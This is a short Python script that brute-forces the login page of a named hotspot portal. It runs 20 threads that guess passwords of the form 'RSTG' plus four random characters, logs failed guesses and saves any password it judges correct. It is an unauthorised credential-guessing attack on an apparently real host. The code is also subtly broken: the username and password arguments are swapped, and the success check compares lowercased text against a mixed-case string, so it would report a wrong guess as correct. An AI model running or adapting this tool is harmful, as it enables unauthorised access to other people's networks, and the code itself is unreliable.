import requests
import random
from threading import Thread
import os

url = "http://atbuhotspot.net/login"
username = 'admin'

def send_request(username, password):
    data = {
        "dst": "http://connectivity-check.ubuntu.com./",
#         "popup": True,
#         "submit":  ,
        "username" : username,
        "password" : password
    }

    r = requests.get(url, data=data)
    print(r.text)
    return r


chars = "abcdefghijklmnopqrstuvwxyz0123456789"
user_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def main():
    while True:
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndpasswd = random.choices(user_chars, k=4)
            passwd = f"RSTG{"".join(rndpasswd)}"
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True
            
        r = send_request(passwd, username)
#        r = send_request(username, passwd) 

        if '<div><input id="boton" name="submit" type="submit" value=" " /></div>' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{passwd}\n")
                f.close()
            print(f"Incorrect {passwd}\n")
        else:
            print(f"Correct Password {passwd}!\n")
            with open("correct_pass.txt", "w") as f:
                f.write(passwd)
            break


for x in range(20):
    Thread(target=main).start()


            
